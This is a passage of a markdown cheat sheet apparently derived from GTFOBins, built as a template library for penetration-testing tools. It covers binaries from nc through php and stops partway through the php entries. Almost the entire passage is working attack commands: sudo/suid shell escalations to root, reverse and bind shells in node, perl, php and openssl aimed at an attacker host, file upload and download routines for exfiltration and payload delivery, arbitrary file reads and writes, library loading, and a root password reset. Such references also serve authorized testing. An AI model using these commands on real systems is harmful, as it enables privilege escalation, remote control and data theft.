```sh title:"GTFOBins Upload Nc Upload #1 (nc upload (sudo / suid / unprivileged)"
nc -l -p $lport <$file_in
```
<!-- cheat
import lports
var file_in
-->

### nc upload #2

Upload nc upload #2 with the Gtfobins GTFOBins technique.

The file is actually read by the invoking shell.

```sh title:"GTFOBins Upload Nc Upload #2 (nc upload (sudo / suid / unprivileged)"
nc $lhost $lport <$file_in
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

## ncdu

### ncdu shell

Spawn ncdu shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ncdu Shell (ncdu shell (sudo / suid / unprivileged)"
ncdu
b
```
<!-- cheat
-->

## ncftp

### ncftp shell

Spawn ncftp shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ncftp Shell (ncftp shell (sudo / suid / unprivileged)"
ncftp
!/bin/sh
```
<!-- cheat
-->

#### ncftp shell - suid override
Spawn ncftp shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Ncftp Shell (ncftp shell (suid variant)"
ncftp
!/bin/sh -p
```
<!-- cheat
-->

## needrestart

### needrestart inherit (inherits from perl)

Start needrestart inherit (inherits from perl) with the Gtfobins GTFOBins technique.

This allows to run Perl code (`...`).

```sh title:"GTFOBins Start Needrestart Inherit (inherits from Perl) (needrestart inherit from perl (sudo / unprivileged)"
echo '...' >$tmp_file
needrestart -c $tmp_file
```
<!-- cheat
var tmp_file
-->

## neofetch

### neofetch shell

Spawn neofetch shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Neofetch Shell (neofetch shell (sudo / unprivileged)"
echo 'exec /bin/sh' >$tmp_file
neofetch --config $tmp_file
```
<!-- cheat
var tmp_file
-->

### neofetch file-read

Read neofetch file read with the Gtfobins GTFOBins technique.

The file content is used as the logo while some other information is displayed on its right.

```sh title:"GTFOBins Read Neofetch File Read (neofetch file read (sudo / unprivileged)"
neofetch --ascii $file_in
```
<!-- cheat
var file_in
-->

## nft

### nft file-read

Read nft file read with the Gtfobins GTFOBins technique.

The content is actually parsed and corrupted by the command.

```sh title:"GTFOBins Read Nft File Read (nft file read (sudo / unprivileged)"
nft -f $file_in
```
<!-- cheat
var file_in
-->

## nginx

### nginx download

Download nginx download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Nginx Download (nginx download (sudo)"
cat >$tmp_file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c $tmp_file
```
<!-- cheat
var tmp_file
-->

### nginx upload

Upload nginx upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Nginx Upload (nginx upload (sudo)"
cat >$tmp_file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c $tmp_file
```
<!-- cheat
var tmp_file
-->

### nginx library-load

Run nginx library load with the Gtfobins GTFOBins technique.

Alternatively, the `ssl_engine` directive can be used.

```sh title:"GTFOBins Run Nginx Library Load (nginx library load (sudo / suid / unprivileged)"
cat >$tmp_file <<EOF
load_module $lib
EOF

nginx -t -c $tmp_file
```
<!-- cheat
var lib
var tmp_file
-->

## nice

### nice shell

Spawn nice shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Nice Shell (nice shell (sudo / suid / unprivileged)"
nice /bin/sh
```
<!-- cheat
-->

#### nice shell - suid override
Spawn nice shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Nice Shell (nice shell (suid variant)"
nice /bin/sh -p
```
<!-- cheat
-->

## nl

### nl file-read

Read nl file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by a leading space added to each line.

```sh title:"GTFOBins Read Nl File Read (nl file read (sudo / suid / unprivileged)"
nl -bn -w1 -s '' $file_in
```
<!-- cheat
var file_in
-->

## nm

### nm file-read

Read nm file read with the Gtfobins GTFOBins technique.

The file content is treated as command line options and disclosed through error messages.

```sh title:"GTFOBins Read Nm File Read (nm file read (sudo / suid / unprivileged)"
nm $file_in
```
<!-- cheat
var file_in
-->

## nmap

### nmap shell

Spawn nmap shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Nmap Shell (nmap shell (sudo / suid / unprivileged)"
nmap --interactive
!/bin/sh
```
<!-- cheat
-->

### nmap file-read

Read nmap file read with the Gtfobins GTFOBins technique.

The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.

```sh title:"GTFOBins Read Nmap File Read (nmap file read (sudo / suid / unprivileged)"
nmap -iL $file_in
```
<!-- cheat
var file_in
-->

### nmap file-write

Write nmap file write with the Gtfobins GTFOBins technique.

The payload appears inside the regular nmap output.

```sh title:"GTFOBins Write Nmap File Write (nmap file write (sudo / suid / unprivileged)"
nmap -oG=$file_out $data
```
<!-- cheat
var data
var file_out
-->

### nmap inherit (inherits from lua)

Run nmap inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Nmap Inherit (inherits from Lua) (nmap inherit from lua (sudo / suid / unprivileged)"
echo '...' >$tmp_file
nmap --script=$tmp_file
```
<!-- cheat
var tmp_file
-->

## node

### node shell

Spawn node shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Node Shell (node shell (capabilities / sudo / suid / unprivileged)"
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
<!-- cheat
-->

#### node shell - capabilities override
Spawn node shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Node Shell (node shell (capabilities variant)"
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
<!-- cheat
-->

#### node shell - suid override
Spawn node shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Node Shell (node shell (suid variant)"
node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
```
<!-- cheat
-->

### node reverse-shell

Start node reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Node Reverse Shell (node reverse shell (sudo / suid / unprivileged)"
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect($lport, "$lhost", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```
<!-- cheat
import tun_ip
import lports
-->

#### node reverse-shell - suid override
Start node reverse shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Start Node Reverse Shell (node reverse shell (suid variant)"
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").connect($lport, "$lhost", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```
<!-- cheat
import tun_ip
import lports
-->

### node bind-shell

Start node bind shell with the Gtfobins GTFOBins technique.

Bind a shell to a local port for the attacker to connect to.

```sh title:"GTFOBins Start Node Bind Shell (node bind shell (sudo / suid / unprivileged)"
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen($lport)'
```
<!-- cheat
import lports
-->

#### node bind-shell - suid override
Start node bind shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Start Node Bind Shell (node bind shell (suid variant)"
node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen($lport)'
```
<!-- cheat
import lports
-->

### node file-read

Read node file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Node File Read (node file read (sudo / suid / unprivileged)"
node -e 'process.stdout.write(require("fs").readFileSync("$file_in"))'
```
<!-- cheat
var file_in
-->

### node file-write

Write node file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Node File Write (node file write (sudo / suid / unprivileged)"
node -e 'require("fs").writeFileSync("$file_out", "$data")'
```
<!-- cheat
var data
var file_out
-->

### node download

Download node download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Node Download (node download (sudo / suid / unprivileged)"
node -e 'require("http").get("$scheme://$lhost$file_in", res => res.pipe(require("fs").createWriteStream("$file_out")))'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### node upload

Upload node upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Node Upload (node upload (sudo / suid / unprivileged)"
node -e 'require("fs").createReadStream("$file_in").pipe(require("http").request("$scheme://$lhost$file_out"))'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## nohup

### nohup shell

Spawn nohup shell with the Gtfobins GTFOBins technique.

This creates a `nohup.out` file in the current working directory.

```sh title:"GTFOBins Spawn Nohup Shell (nohup shell (sudo / suid / unprivileged)"
nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'
```
<!-- cheat
-->

#### nohup shell - suid override
Spawn nohup shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Nohup Shell (nohup shell (suid variant)"
nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
```
<!-- cheat
-->

### nohup command

Execute nohup command with the Gtfobins GTFOBins technique.

The `nohup.out` file contains the standard output and error of the command.

```sh title:"GTFOBins Execute Nohup Command (nohup command (sudo / suid / unprivileged)"
nohup $cmd_file
cat nohup.out
```
<!-- cheat
var cmd_file
-->

## npm

### npm shell #1

Spawn npm shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Npm Shell #1 (npm shell (sudo / unprivileged)"
npm exec /bin/sh
```
<!-- cheat
-->

### npm shell #2

Spawn npm shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Npm Shell #2 (npm shell (sudo / unprivileged)"
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
npm -C . i
```
<!-- cheat
-->

### npm shell #3

Spawn npm shell #3 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Npm Shell #3 (npm shell (sudo / unprivileged)"
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
npm -C . run xxx
```
<!-- cheat
-->

## nroff

### nroff shell

Spawn nroff shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Nroff Shell (nroff shell (sudo / unprivileged)"
echo /bin/sh >groff
chmod +x groff
GROFF_BIN_PATH=. nroff
```
<!-- cheat
-->

### nroff file-read

Read nroff file read with the Gtfobins GTFOBins technique.

The file is typeset and some warning messages may appear.

```sh title:"GTFOBins Read Nroff File Read (nroff file read (sudo / unprivileged)"
nroff $file_in
```
<!-- cheat
var file_in
-->

## nsenter

### nsenter shell

Spawn nsenter shell with the Gtfobins GTFOBins technique.

The shell command can be omitted.

```sh title:"GTFOBins Spawn Nsenter Shell (nsenter shell (sudo / suid / unprivileged)"
nsenter /bin/sh
```
<!-- cheat
-->

#### nsenter shell - suid override
Spawn nsenter shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Nsenter Shell (nsenter shell (suid variant)"
nsenter /bin/sh -p
```
<!-- cheat
-->

## ntpdate

### ntpdate file-read

Read ntpdate file read with the Gtfobins GTFOBins technique.

The file is actually parsed and lines are leaked through error messages.

```sh title:"GTFOBins Read Ntpdate File Read (ntpdate file read (sudo / suid / unprivileged)"
ntpdate -a x -k $file_in -d localhost
```
<!-- cheat
var file_in
-->

## nvim

Alias of [vim](#vim). All techniques from `vim` apply.

## octave

The payloads are compatible with GUI mode.

### octave shell

Spawn octave shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Octave Shell (octave shell (sudo / suid / unprivileged)"
octave-cli --eval 'system("/bin/sh")'
```
<!-- cheat
-->

### octave file-read

Read octave file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Octave File Read (octave file read (sudo / suid / unprivileged)"
octave-cli --eval 'format none; fid = fopen("$file_in"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
```
<!-- cheat
var file_in
-->

### octave file-write

Write octave file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Octave File Write (octave file write (sudo / suid / unprivileged)"
octave-cli --eval 'fid = fopen("$file_out", "w"); fputs(fid, "$data"); fclose(fid);'
```
<!-- cheat
var data
var file_out
-->

## od

### od file-read

Read od file read with the Gtfobins GTFOBins technique.

Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences.

```sh title:"GTFOBins Read Od File Read (od file read (sudo / suid / unprivileged)"
od -An -c -w999 $file_in
```
<!-- cheat
var file_in
-->

## opencode

### opencode command

Execute opencode command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Opencode Command (opencode command (sudo / suid / unprivileged)"
opencode
! $cmd_file
```
<!-- cheat
var cmd_file
-->

### opencode inherit (inherits from sqlite3)

Encode opencode inherit (inherits from sqlite3) with the Gtfobins GTFOBins technique.

This allows to run SQLite queries (`...`) provided that `sqlite3` is installed.

```sh title:"GTFOBins Encode Opencode Inherit (inherits from Sqlite3) (opencode inherit from sqlite3 (sudo / unprivileged)"
opencode db '...'
```
<!-- cheat
-->

## openssl

### openssl reverse-shell

Start openssl reverse shell with the Gtfobins GTFOBins technique.

The shell process is not spawn by `openssl`.

```sh title:"GTFOBins Start Openssl Reverse Shell (openssl reverse shell (sudo / suid / unprivileged)"
mkfifo $tmp_sock
/bin/sh -i <$tmp_sock 2>&1 | openssl s_client -quiet -connect $lhost:$lport >$tmp_sock
```
<!-- cheat
import tun_ip
import lports
var tmp_sock
-->

### openssl file-read

Read openssl file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Openssl File Read (openssl file read (sudo / suid / unprivileged)"
openssl enc -in $file_in
```
<!-- cheat
var file_in
-->

### openssl file-write #1

Write openssl file write #1 with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Openssl File Write #1 (openssl file write (sudo / suid / unprivileged)"
echo $data | openssl enc -out $file_out
```
<!-- cheat
var data
var file_out
-->

### openssl file-write #2

Write openssl file write #2 with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Openssl File Write #2 (openssl file write (sudo / suid / unprivileged)"
openssl enc -in $file_in -out $file_out
```
<!-- cheat
var file_in
var file_out
-->

### openssl download

Download openssl download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Openssl Download (openssl download (sudo / suid / unprivileged)"
openssl s_client -quiet -connect $lhost:$lport >$file_out
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### openssl upload

Upload openssl upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Openssl Upload (openssl upload (sudo / suid / unprivileged)"
openssl s_client -quiet -connect $lhost:$lport <$file_in
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

### openssl library-load

Run openssl library load with the Gtfobins GTFOBins technique.

Load an attacker-supplied shared library.

```sh title:"GTFOBins Run Openssl Library Load (openssl library load (sudo / suid / unprivileged)"
openssl req -engine ./lib.so
```
<!-- cheat
-->

## openvpn

### openvpn shell

Spawn openvpn shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Openvpn Shell (openvpn shell (sudo / suid / unprivileged)"
openvpn --dev null --script-security 2 --up '/bin/sh -s'
```
<!-- cheat
-->

#### openvpn shell - suid override
Spawn openvpn shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Openvpn Shell (openvpn shell (suid variant)"
openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
```
<!-- cheat
-->

### openvpn file-read

Read openvpn file read with the Gtfobins GTFOBins technique.

The file is actually parsed and the first partial wrong line is returned in an error message.

```sh title:"GTFOBins Read Openvpn File Read (openvpn file read (sudo / suid / unprivileged)"
openvpn --config $file_in
```
<!-- cheat
var file_in
-->

## openvt

### openvt command

Execute openvt command with the Gtfobins GTFOBins technique.

The command execution is displayed on the virtual console.

```sh title:"GTFOBins Execute Openvt Command (openvt command (sudo)"
openvt -- $cmd_file
```
<!-- cheat
var cmd_file
-->

## opkg

### opkg shell

Spawn opkg shell with the Gtfobins GTFOBins technique.

Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo 'exec /bin/sh' >x.sh fpm -n x -s dir -t deb -a all --before-install x.sh . ```

```sh title:"GTFOBins Spawn Opkg Shell (opkg shell (sudo)"
rpm opkg install x_1.0_all.deb
```
<!-- cheat
-->

## pandoc

### pandoc file-read

Read pandoc file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Pandoc File Read (pandoc file read (sudo / suid / unprivileged)"
pandoc -t plain $file_in
```
<!-- cheat
var file_in
-->

### pandoc file-write

Write pandoc file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Pandoc File Write (pandoc file write (sudo / suid / unprivileged)"
echo $data | pandoc -t plain -o $file_out
```
<!-- cheat
var data
var file_out
-->

### pandoc inherit (inherits from lua)

Run pandoc inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Pandoc Inherit (inherits from Lua) (pandoc inherit from lua (sudo / suid / unprivileged)"
echo '...' >$tmp_file
pandoc -L $tmp_file /dev/null
```
<!-- cheat
var tmp_file
-->

## passwd

### passwd privilege-escalation

Run passwd privilege escalation with the Gtfobins GTFOBins technique.

This changes the root password to `x`, so it's now possible to log in using, for example, `su`.

```sh title:"GTFOBins Run Passwd Privilege Escalation (passwd privilege escalation (sudo)"
echo -e 'x\nx' | passwd
```
<!-- cheat
-->

## paste

### paste file-read

Read paste file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Paste File Read (paste file read (sudo / suid / unprivileged)"
paste $file_in
```
<!-- cheat
var file_in
-->

## pax

### pax file-read

Read pax file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Pax File Read (pax file read (sudo / suid / unprivileged)"
pax -w $file_in | tar -xO
```
<!-- cheat
var file_in
-->

## pdb

### pdb inherit (inherits from python)

Run pdb inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`).

```sh title:"GTFOBins Run Pdb Inherit (inherits from Python) (pdb inherit from python (sudo / unprivileged)"
echo '...' >$tmp_file
pdb $tmp_file
cont
```
<!-- cheat
var tmp_file
-->

## pdflatex

### pdflatex shell

Spawn pdflatex shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pdflatex Shell (pdflatex shell (sudo / suid / unprivileged)"
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```
<!-- cheat
-->

### pdflatex file-read

Read pdflatex file read with the Gtfobins GTFOBins technique.

The read file will be part of the PDF output.

```sh title:"GTFOBins Read Pdflatex File Read (pdflatex file read (sudo / suid / unprivileged)"
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}'
pdftotext texput.pdf -
```
<!-- cheat
var file_in
-->

### pdflatex file-write

Write pdflatex file write with the Gtfobins GTFOBins technique.

The file can only be written in the current directory, and the `.tex` extension is mandatory.

```sh title:"GTFOBins Write Pdflatex File Write (pdflatex file write (sudo / suid / unprivileged)"
pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{$data}\immediate\closeout\tempfile\end{document}'
```
<!-- cheat
var data
-->

## pdftex

### pdftex shell

Spawn pdftex shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pdftex Shell (pdftex shell (sudo / suid / unprivileged)"
pdftex --shell-escape '\write18{/bin/sh}\end'
```
<!-- cheat
-->

## perf

### perf shell

Spawn perf shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Perf Shell (perf shell (sudo / suid / unprivileged)"
perf stat /bin/sh
```
<!-- cheat
-->

#### perf shell - suid override
Spawn perf shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Perf Shell (perf shell (suid variant)"
perf stat /bin/sh -p
```
<!-- cheat
-->

## perl

### perl shell #1

Spawn perl shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Perl Shell #1 (perl shell (capabilities / sudo / unprivileged)"
perl -e 'exec "/bin/sh"'
```
<!-- cheat
-->

#### perl shell #1 - capabilities override
Spawn perl shell #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Perl Shell #1 (perl shell (capabilities variant)"
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```
<!-- cheat
-->

### perl shell #2

Spawn perl shell #2 with the Gtfobins GTFOBins technique.

The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.

```sh title:"GTFOBins Spawn Perl Shell #2 (perl shell (sudo / unprivileged)"
PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
```
<!-- cheat
-->

### perl reverse-shell

Start perl reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Perl Reverse Shell (perl reverse shell (sudo / unprivileged)"
perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
<!-- cheat
import tun_ip
import lports
-->

### perl file-read

Read perl file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Perl File Read (perl file read (sudo / suid / unprivileged)"
perl -ne print $file_in
```
<!-- cheat
var file_in
-->

### perl download

Download perl download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Perl Download (perl download (sudo / unprivileged)"
perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"$lhost",PeerPort=>80,Proto=>"tcp") or die; print $s "GET $file_in HTTP/1.1\r\nHost: $lhost\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "$file_out") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
```
<!-- cheat
import tun_ip
var file_in
var file_out
-->

### perl upload

Upload perl upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Perl Upload (perl upload (sudo / unprivileged)"
perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"$lhost", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "$file_in") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: $lhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
```
<!-- cheat
import tun_ip
var file_in
-->

## perlbug

### perlbug shell

Spawn perlbug shell with the Gtfobins GTFOBins technique.

This requires to press `Enter` serveral times before the shell is spawn.

```sh title:"GTFOBins Spawn Perlbug Shell (perlbug shell (sudo / unprivileged)"
perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
```
<!-- cheat
-->

## pexec

### pexec shell

Spawn pexec shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pexec Shell (pexec shell (sudo / suid / unprivileged)"
pexec /bin/sh
```
<!-- cheat
-->

#### pexec shell - suid override
Spawn pexec shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Pexec Shell (pexec shell (suid variant)"
pexec /bin/sh -p
```
<!-- cheat
-->

## pg

### pg shell

Spawn pg shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pg Shell (pg shell (sudo / suid / unprivileged)"
pg /etc/hosts
!/bin/sh
```
<!-- cheat
-->

### pg file-read

Read pg file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Pg File Read (pg file read (sudo / suid / unprivileged)"
pg $file_in
```
<!-- cheat
var file_in
-->

## php

### php shell #1

Spawn php shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Php Shell #1 (php shell (capabilities / sudo / suid / unprivileged)"
php -r 'system("/bin/sh -i");'
```
<!-- cheat
-->

#### php shell #1 - capabilities override
Spawn php shell #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Php Shell #1 (php shell (capabilities variant)"
php -r 'posix_setuid(0); system("/bin/sh -i");'
```
<!-- cheat
-->

### php shell #2

Spawn php shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Php Shell #2 (php shell (capabilities / sudo / suid / unprivileged)"
php -r 'passthru("/bin/sh -i");'
```
<!-- cheat
-->

#### php shell #2 - capabilities override
Spawn php shell #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Php Shell #2 (php shell (capabilities variant)"
php -r 'posix_setuid(0); passthru("/bin/sh -i");'
```
<!-- cheat
-->

### php shell #3

Spawn php shell #3 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Php Shell #3 (php shell (capabilities / sudo / suid / unprivileged)"
php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```
<!-- cheat
-->

#### php shell #3 - capabilities override
Spawn php shell #3 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Php Shell #3 (php shell (capabilities variant)"
php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```
<!-- cheat
-->

### php shell #4

Spawn php shell #4 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Php Shell #4 (php shell (capabilities / sudo / suid / unprivileged)"
php -r 'pcntl_exec("/bin/sh");'
```
<!-- cheat
-->

#### php shell #4 - capabilities override
Spawn php shell #4 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Php Shell #4 (php shell (capabilities variant)"
php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
```
<!-- cheat
-->

#### php shell #4 - suid override
Spawn php shell #4 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Php Shell #4 (php shell (suid variant)"
php -r 'pcntl_exec("/bin/sh", ["-p"]);'
```
<!-- cheat
-->

### php command #1

Execute php command #1 with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Php Command #1 (php command (sudo / suid / unprivileged)"
php -r 'echo shell_exec("$cmd_file");'
```
<!-- cheat
var cmd_file
-->

### php command #2

Execute php command #2 with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Php Command #2 (php command (sudo / suid / unprivileged)"
php -r '$r=array(); exec("$cmd_file", $r); print(join("\n",$r));'
```
<!-- cheat
var cmd_file
-->

### php command #3

Execute php command #3 with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Php Command #3 (php command (sudo / suid / unprivileged)"
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("$cmd_file", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
```
<!-- cheat
var cmd_file
-->

### php reverse-shell

Start php reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Php Reverse Shell (php reverse shell (sudo / suid / unprivileged)"
php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
```
<!-- cheat
import tun_ip
import lports
-->

### php file-read

Read php file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Php File Read (php file read (sudo / suid / unprivileged)"
